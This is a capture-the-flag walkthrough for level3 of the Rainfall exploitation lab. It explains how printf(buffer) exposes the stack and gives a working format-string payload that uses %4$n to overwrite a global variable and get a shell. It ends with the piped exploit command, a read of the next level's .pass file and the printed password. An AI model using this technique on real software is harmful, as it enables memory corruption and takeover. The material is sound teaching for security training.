# Rainfall

## Level3

```sh
(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:     push   %ebp
   0x0804851b <+1>:     mov    %esp,%ebp
   0x0804851d <+3>:     and    $0xfffffff0,%esp
   0x08048520 <+6>:     call   0x80484a4 <v> # Call function v
   0x08048525 <+11>:    leave  
   0x08048526 <+12>:    ret    
End of assembler dump.
```

```sh
(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x218,%esp
   0x080484ad <+9>:     mov    0x8049860,%eax #Load stdin file pointer into eax
   0x080484b2 <+14>:    mov    %eax,0x8(%esp) # Place stdin as 3rd argument for fgets
   0x080484b6 <+18>:    movl   $0x200,0x4(%esp) # Place size (512) as 2nd argument for fgets
   0x080484be <+26>:    lea    -0x208(%ebp),%eax # Load buffer of size (512) into eax
   0x080484c4 <+32>:    mov    %eax,(%esp) # Place buffer as 1st argument for fgets
   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt> # call fgets(buffer, 512, stdin)
   0x080484cc <+40>:    lea    -0x208(%ebp),%eax # Load buffer again into eax
   0x080484d2 <+46>:    mov    %eax,(%esp) # Place buffer as argument for printf
   0x080484d5 <+49>:    call   0x8048390 <printf@plt> #printf(buffer)
   0x080484da <+54>:    mov    0x804988c,%eax # load global_variable into eax
   0x080484df <+59>:    cmp    $0x40,%eax # global_variable == 0x40 ?
   0x080484e2 <+62>:    jne    0x8048518 <v+116>
   0x080484e4 <+64>:    mov    0x8049880,%eax # TRUE
   0x080484e9 <+69>:    mov    %eax,%edx
   0x080484eb <+71>:    mov    $0x8048600,%eax
   0x080484f0 <+76>:    mov    %edx,0xc(%esp)
   0x080484f4 <+80>:    movl   $0xc,0x8(%esp)
   0x080484fc <+88>:    movl   $0x1,0x4(%esp)
   0x08048504 <+96>:    mov    %eax,(%esp)
   0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:   movl   $0x804860d,(%esp)
   0x08048513 <+111>:   call   0x80483c0 <system@plt>
   0x08048518 <+116>:   leave # FALSE
   0x08048519 <+117>:   ret
End of assembler dump.
```

```sh
   0x080484da <+54>:    mov    0x804988c,%eax # load global_variable into eax
                                   ^
```

Here we have the address of the variable we need to override

## Format String Vulnerability

We can exploit printf to do it since the buffer used by fgets is the only argument provided to printf without a format string

```c
fgets(buffer, 512, stdin);
printf(buffer);
```

We can use the format parameters (%d, %s, %n, %x, ...) and the behavior of variadic arguments to our advantage

*First let's remember that function parameters are always pushed to the stack first before being accessible by the function*

`printf()` is usally composed of 6 things

- a format string called fmt
- additionnal parameters
- va_list ptr
```c
/* Create an undefined pointer */ 
char *ptr;
```
- va_start(ptr, fmt)
```c
/* Make the pointer point to the address of the format string and then move it to the next parameter */
ptr = (char *)&fmt;
ptr += sizeof(fmt);
```
- va_arg(ptr, int) <sup><sub>Can use any type instead of int</sub></sup>
```c
/* Retrieve the current value of ptr and move the pointer to the next parameter */
int value = *(int *)ptr;
ptr += sizeof(int);
```
- va_end
```c
/* Clean up if needed, usually just set the pointer back to null */
ptr = null;
```

Basically if we were to call printf like this:

```c
printf("%x");
```

It will try to retrieve his second parameter (the first one being the buffer fmt) and print its value as an 8 digit padded hexadecimal number,
since no additionnal parameters were provided it would result in undefined behavior
- Printing other values from the stack
- Crash if the accessed memory is invalid

Now let's try to exploit this:

```sh
level3@RainFall:~$ ./level3
AAAA %p %p %p %p %p #user input
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 #printf
```

- "AAAA" is the string we wrote at the beginning of fmt
- 0x200 is a random value on the stack found by the 1st %p
- 0xb7fd1ac0 is another random value on the stack found by the 2nd %p
- 0xb7ff37d0 is another random value on the stack found by the 3rd %p
- **0x41414141 is the hexadecimal value of "AAAA"** (0 to 4th bytes of fmt)
- 0x20702520 is the hexadecimal value of " %p " (4 to 8th bytes of fmt)
- 0x25207025 is the hexadecimal value of "%p %" (8 to 12th bytes of fmt)

What happened here??

printf tried to retrieve arguments on the stack until it reached back to his first parameter being fmt
Meaning we can use this in order to provide a target memory address instead of using "AAAA" with the additional use of the `%n` specifier and the positional parameter `$`

We already know the position of our buffer on the stack since we overwritten the 4th %p

`%n specifier`**: The number of characters written so far is stored into the integer pointed to by the corresponding argument.**

`$`**: With positional parameters, you can specify the position of the argument to be used**
Exemple

```c
printf("%3$s %1$s %2$d", "world", 42, "hello");
//This will print "hello world 42"
```

Now that we have explained everything let's start the exploit:
- `0x804988c` is the address of the variable we want to overwrite (`\x8c\x98\x04\x08` in little endian)
- our fmt string is self accessible from printf as it's `0` and "`4th parameter`"
- We need our variable to be equal to `0x40` (64 in decimal)

```sh
"\x8c\x98\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%4$n"
```

We first write the targeted address, then we fill with 60 garbage byte, we target the 4th parameter which is the address we wrote at the beginning of fmt and we use the %n modifier to change the value of the targeted address to the total written bytes which is 64 ( the 4 bytes of the address + the 60 gargage 'a')

This result in setting the variable value to 64 and exploit the binary successfully

```sh
level3@RainFall:~$ ( python -c "print('\x8c\x98\x04\x08' + 'a' * 60 + '%4\$n')" ; cat ) | ./level3 
��aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```